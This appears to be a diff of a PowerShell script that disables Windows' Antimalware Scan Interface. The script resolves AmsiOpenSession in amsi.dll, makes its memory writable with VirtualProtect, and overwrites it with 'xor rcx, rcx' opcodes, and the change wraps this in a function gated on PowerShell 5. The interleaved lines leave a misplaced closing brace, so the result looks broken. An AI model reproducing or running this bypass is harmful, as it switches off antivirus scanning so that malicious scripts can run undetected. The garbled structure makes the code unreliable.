@@ -70,11 +70,22 @@ function getDelegateType {
 $func). SetImplementationFlags('Runtime, Managed')
     return $type.CreateType()
 }
-if ($PSVersionTable.PSVersion.Major -eq 5) {
+function amsi-opensession {
     [IntPtr]$funcAddr = LookupFunc amsi.dll AmsiOpenSession
+    if ($PSVersionTable.PSVersion.Major -eq 5) {
     $oldProtectionBuffer = 0
+        [IntPtr]$funcAddr = LookupFunc amsi.dll AmsiOpenSession
     $vp=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll VirtualProtect), (getDelegateType @([IntPtr], [UInt32], [UInt32], [UInt32].MakeByRefType()) ([Bool])))
+        $oldProtectionBuffer = 0
     $vp.Invoke($funcAddr, 3, 0x40, [ref]$oldProtectionBuffer)
+        $vp=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll VirtualProtect), (getDelegateType @([IntPtr], [UInt32], [UInt32], [UInt32].MakeByRefType()) ([Bool])))
     $buf = [Byte[]] (0x48,0x31,0xc9)  # Opcode for xor rcx, rcx;
+        $vp.Invoke($funcAddr, 3, 0x40, [ref]$oldProtectionBuffer)
     [System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $funcAddr, 3)
+        $buf = [Byte[]] (0x48,0x31,0xc9)  # Opcode for xor rcx, rcx;
+}
+        [System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $funcAddr, 3)
+    } else {
+        Write-Host "Current PowerShell version is not 5."
+    }
 } 
